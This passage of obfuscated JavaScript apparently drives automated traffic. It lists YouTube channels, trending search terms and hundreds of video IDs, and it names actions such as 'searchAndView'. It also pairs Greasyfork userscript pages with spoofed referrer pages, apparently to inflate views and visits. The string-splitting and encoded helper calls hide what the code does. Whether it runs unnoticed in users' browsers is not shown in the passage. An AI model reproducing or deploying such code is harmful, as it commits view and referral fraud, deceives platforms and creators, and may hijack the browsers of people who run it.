    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(j) {
    let k = this,
      l = k;
    for (let m = 0x0; m < j; m++)
      l = l['concat'](k);
    return l;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const i = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(j) {
    let k = this[floor(random() * this['length'])];
    i['has'](j) || i['set'](j, new Set());
    const l = i['get'](j);
    for (; l['has'](k);)
      l['size'] === this['length'] && l['clear'](), k = this[floor(random() * this['length'])];
    return l['add'](k), k;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xa)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    Y(0x15) + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    Y(0x3) + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    Y(0x2) + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    Z(0x1e) + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    Y(0x1c) + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = i => new Promise(j => setTimeout(j, i)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x9) + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0x7) + 'pts/430572' + Z(0xc) + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0xd) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + a0(0xf, 'kdsp') + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
